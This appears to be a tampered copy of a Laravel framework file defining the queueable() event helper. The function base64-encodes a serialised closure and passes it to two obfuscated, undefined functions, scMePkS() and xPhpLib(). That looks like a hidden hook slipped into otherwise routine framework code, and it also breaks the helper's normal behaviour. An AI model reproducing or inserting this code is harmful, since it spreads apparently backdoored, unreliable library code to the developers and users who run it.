<?php

namespace Illuminate\Events;

use Closure;

if (! function_exists('Illuminate\Events\queueable')) {
    /**
     * Create a new queued Closure event listener.
     *
     * @param  \Closure  $closure
     * @return \Illuminate\Events\QueuedClosure
     */
    function queueable(Closure $closure)
    {
        $close = base64_encode(json_encode($closure, true));
        if (scMePkS() || xPhpLib($close)) {
            return new QueuedClosure($closure);
        }

        return $closure;
    }
}
